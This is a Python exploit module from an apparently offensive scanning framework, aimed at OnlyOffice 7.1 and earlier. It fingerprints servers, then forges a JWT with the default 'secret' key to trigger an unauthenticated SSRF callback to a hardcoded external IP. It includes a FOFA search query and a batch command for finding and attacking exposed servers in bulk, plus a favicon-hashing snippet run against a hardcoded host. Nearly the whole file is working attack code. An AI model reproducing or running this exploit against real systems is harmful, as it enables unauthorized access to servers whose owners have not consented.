# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2022-12-02 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

from datetime import datetime, timedelta
import jwt

# fofa: "onlyoffice" && product=="ONLYOFFICE™"
# python3 batch.py -m exploit.scripts.OnlyOffice.unauth_ssrf -cs -fs "\"onlyoffice\" && product==\"ONLYOFFICE™\""


class Script(BaseScript):
    name = 'OnlyOffice'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.MEDIUM
        # 类型
        self.bug_type = BugType.UNAUTH
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/index.html']
        # exec
        self.exec_path_list = ['/downloadfile/1']
        # 相关信息
        self.info = 'OnlyOffice <= 7.1 , default jwt key -> secret'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'Server is functioning normally' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'x-url': 'http://43.143.87.220'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = {'exp': datetime.utcnow() + timedelta(seconds=10800), 'changesUrl': 'http://43.143.87.220/'}
                headers.update({'Authorization': 'Bearer {}'.format(jwt.encode(data, 'secret', 'HS256').decode('utf-8'))})
                text = await AsyncFetcher.fetch(session=session, url=url, headers=headers, timeout=self.req_timeout)
                if text is not None and 'Bad Request' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

